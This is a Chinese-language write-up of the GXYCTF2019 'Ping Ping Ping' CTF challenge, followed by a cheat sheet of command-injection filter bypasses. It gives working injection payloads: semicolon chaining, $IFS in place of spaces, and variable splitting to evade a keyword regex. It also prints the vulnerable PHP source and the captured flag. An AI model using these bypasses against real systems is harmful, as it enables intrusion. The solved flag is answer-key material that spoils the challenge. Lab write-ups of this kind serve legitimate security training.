# [GXYCTF2019]Ping Ping Ping

## 题目来源

[GXYCTF2019]Ping Ping Ping

## web + 知识点

命令注入、黑名单绕过、`$IFS` 绕过空格过滤、变量拼接绕过关键字过滤、源码回显分析。

## 解题思路

我先打开首页，页面只返回了一行非常短的内容：

```text
/?ip=
```

这说明真正的功能点应该就在 `ip` 参数上。我接着直接访问：

```text
?ip=127.0.0.1
```

页面返回了标准的 `ping` 结果，说明后端大概率是把用户输入直接拼接进了系统命令，类似：

```php
shell_exec("ping -c 4 ".$ip);
```

既然是典型 ping 功能，我第一反应就是测试命令注入。于是我尝试：

```text
?ip=1;id
```

结果页面在 `ping` 统计信息后面额外输出了：

```text
uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
```

到这里可以确认命令执行已经成立，分号 `;` 可以成功拼接额外命令。

正常情况下，下一步我会直接尝试：

```text
?ip=1;cat /flag
```

但这题显然额外加了过滤。实际测试发现：

- 带 `/` 会返回 `fxck your symbol!`
- 带空格会返回 `fxck your space!`
- 直接出现 `flag` 会返回 `fxck your flag!`

为了搞清楚过滤规则，我继续做了几次探测：

```text
?ip=1;pwd
?ip=1;ls
```

页面分别回显：

```text
/var/www/html
```

以及：

```text
flag.php
index.php
```

这一步非常重要。它说明当前目录下其实只有两个文件，而真正的 flag 很可能就写在 `flag.php` 里。

接下来我又利用命令执行去读取 `index.php` 源码。为了绕过空格过滤，我不能直接写：

```text
cat index.php
```

而是要用 shell 里的内部字段分隔符 `IFS` 来代替空格，也就是：

```text
cat$IFS$1index.php
```

实际提交时，为了让 `$` 不在本地被提前处理，我使用了正确转义后的等价形式。页面最终成功回显了 `index.php` 源码，核心逻辑如下：

```php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}
```

源码把所有绕过点都解释清楚了：

1. 斜杠、引号、星号、括号等符号会被 `symbol` 黑名单拦截。
2. 普通空格会被单独拦截。
3. 字符串里只要按顺序出现 `f`、`l`、`a`、`g`，就会被 `flag` 黑名单命中。
4. 但分号 `;` 没有被过滤，所以命令拼接依旧成立。

因此最后的任务就变成两件事：

1. 用 `$IFS` 绕过空格；
2. 用变量拼接把 `flag` 这个关键字拆开，避免正则 `/.*f.*l.*a.*g.*/` 直接命中。

https://da8b31a1a5c948b7020488cc.http-ctf2.dasctf.com/?ip=1;b=l;a=f;c=a;d=g;cat$IFS$a$b$c$d.php

直接变量拼接就好了

页面最终回显：

```php
<?php
$flag = "CTF2{7b855c70-2b07-48d0-b43e-766129ec9046}";
?>
```

至此成功拿到 flag。

## Flag

`CTF2{7b855c70-2b07-48d0-b43e-766129ec9046}`



**. 命令执行绕过方式**

**1. 命令拼接符绕过**
先看哪些分隔符没被拦：

- `;`
- `|`
- 换行 `%0a`
- `&&`
- `||`

思路：

- 一个不行就换另一个
- 有些题禁 `;`，但 `|` 还能用
- 有些题禁可见符号，换行反而能接命令

**2. 空格绕过**
最常见：

- `${IFS}`
- `$IFS$1`
- 制表符 `%09`
- `<`、`>`、换行替代参数分隔
- shell 变量拼接制造“伪空格”

**3. 关键字绕过**
像题里拦 `flag`、`bash` 这种：

- 变量拼接：`a=g; fla$a`
- 引号拆分：`f''lag`
- 通配符：`fla?`、`fla*`
- 环境变量截取
- 大小写变化
- 编码/转义后再还原

**4. 路径绕过**
如果 `/` 被拦：

- 先 `pwd`、`ls` 锁当前目录
- 直接利用当前目录文件名
- 用相对路径代替绝对路径
- 用 shell 展开、变量、模式匹配代替完整路径

**5. 文件名绕过**
如果目标文件名被拦：

- 字符串拆分
- 通配匹配
- 变量补全最后一个字符
- 先 `ls` 看目录里唯一可疑文件，再模糊匹配它

思路：

- 先知道“要找什么”，再决定怎么写这个名字
- 唯一文件时，模糊匹配很好用

**6. 命令替代**
`cat` 不行就换：

- `more`
- `less`
- `head`
- `tail`
- `sed`
- `awk`
- `nl`
- `tac`
- `php -r`
- `python -c`